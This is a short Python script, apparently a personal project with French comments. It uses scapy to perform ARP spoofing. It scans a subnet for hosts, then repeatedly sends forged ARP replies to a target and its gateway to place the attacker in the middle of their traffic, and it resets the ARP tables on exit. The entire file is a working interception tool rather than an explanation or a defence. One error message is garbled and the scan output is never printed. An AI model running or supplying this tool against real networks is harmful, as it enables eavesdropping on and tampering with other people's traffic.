#!/usr/bin/env python
# using scapy 
from scapy.all import Ether, ARP, srp, send, conf
import argparse
import sys
import time
from ipaddress import ip_address, IPv4Address

def poisoning(target_ip, spoof_ip, mac):
# change mac adress in arp table on target_ip
    packet = ARP(pdst=target_ip, hwdst=mac, psrc=spoof_ip, op=2)
    send(packet, verbose=0)

def restore(target_ip, spoof_ip, mac1, mac2):
    packet = ARP(pdst=target_ip, hwdst=mac1, psrc=spoof_ip, hwsrc=mac2, op=2)
    send(packet, verbose=0, count=4)

def scan(ip): # requete arp pour recuperer l'adresse mac de l'hote
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") # add broadcast
    arp_request_broadcast = broadcast/arp_request # le paquet avec la requête
    
    answered_list = srp(arp_request_broadcast, timeout=1, #recuperer les reponses
                                verbose=False)[0]
    clients_list = []
    print("IP\t\t\tMAC Address")
    print("----------------------------------------------------")
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)

    return clients_list

def parse_arguments():
    parser = argparse.ArgumentParser()
    
    # Ajoutez l'option pour le scan
    parser.add_argument("-s", "--scan", dest="scan_ip", help="Scan IP")

    # Ajoutez les arguments pour <IP-src> <MAC-src> <IP-target> <MAC-target>
    parser.add_argument("ipsrc", nargs="?", help="Gateway IP")
    parser.add_argument("macsrc", nargs="?", help="Gateway MAC")
    parser.add_argument("iptarget", nargs="?", help="Target IP")
    parser.add_argument("mactarget", nargs="?", help="Target MAC")

    return parser.parse_args()

def main():
    args = parse_arguments()
    if args.scan_ip:
        scan(args.scan_ip)
        sys.exit(1)
    elif any(arg is None for arg in [args.ipsrc, args.macsrc, args.iptarget, args.mactarget]):
        print("Error: you must provide these 4 parameterIP-src>s : < <MAC-src> <IP-target> <MAC-target> or use -s or --scan'")
        sys.exit(1)

    sent_packets_count = 0
    try:
        while True:
            print("Starting poisoning..")
            poisoning(args.iptarget, args.ipsrc, args.mactarget) # First time to update target arp table
            poisoning(args.ipsrc, args.iptarget, args.macsrc)  # Second time to update router arp table
            sent_packets_count +=2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
        restore(args.ipsrc, args.iptarget, args.macsrc, args.mactarget)
        restore(args.iptarget, args.ipsrc, args.mactarget, args.macsrc)

if __name__ == "__main__":
    main()